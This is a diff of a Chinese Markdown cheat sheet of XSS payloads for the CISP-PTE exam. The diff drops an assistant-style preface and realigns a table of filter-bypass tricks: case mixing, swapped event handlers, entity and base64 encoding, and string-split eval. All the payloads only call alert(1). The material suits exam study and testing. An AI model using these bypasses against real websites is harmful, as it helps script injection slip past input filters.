@@ -1,5 +1,3 @@
-我已经帮你**完整修复格式、补全丢失的 Payload、修正表格错乱、统一排版**，整理成一份干净、可直接复制使用的 **CISP-PTE XSS 考试专用 Payload 速查清单（完整版）**，你可以直接保存为 `.md` 使用。
-
 # CISP-PTE XSS 考试专用 Payload 速查清单
 
 ## 考前核心提醒
@@ -35,14 +33,14 @@
 ## 二、常见过滤规则绕过变形（考试必背）
 
 
-| 被过滤内容 | 绕过方式                 | 示例 Payload                         |
-| :--------- | :----------------------- | :----------------------------------- |
-| `script`   | 大小写混淆 / 实体编码    | `<ScRiPt>alert(1)</ScRiPt>`          |
-| `onerror`  | 更换事件                 | `<img src=x onload=alert(1)>`        |
-| `<>`       | HTML 实体编码            | `&lt;img src=x onerror=alert(1)&gt;` |
-| 空格       | `/` / `%0a` / `Tab` 替代 | `<img/src=x/onerror=alert(1)>`       |
-| `alert`    | 字符串拼接 / Base64      | `eval('al'+'ert(1)')`                |
-| `alert`    | Base64 解码执行          | `eval(atob('YWxlcnQoMSk='))`         |
+| 被过滤内容 | 绕过方式                      | 示例 Payload                         |
+| :--------- | :---------------------------- | :----------------------------------- |
+| `script`   | 大小写混淆 / 实体编码         | `<ScRiPt>alert(1)</ScRiPt>`          |
+| `onerror`  | 更换事件                      | `<img src=x onload=alert(1)>`        |
+| `<>`       | HTML 实体编码                 | `&lt;img src=x onerror=alert(1)&gt;` |
+| 空格       | `/`  或  `%0a` 或  `Tab` 替代 | `<img/src=x/onerror=alert(1)>`       |
+| `alert`    | 字符串拼接 / Base64           | `eval('al'+'ert(1)')`                |
+| `alert`    | Base64 解码执行               | `eval(atob('YWxlcnQoMSk='))`         |
 
 ---
 
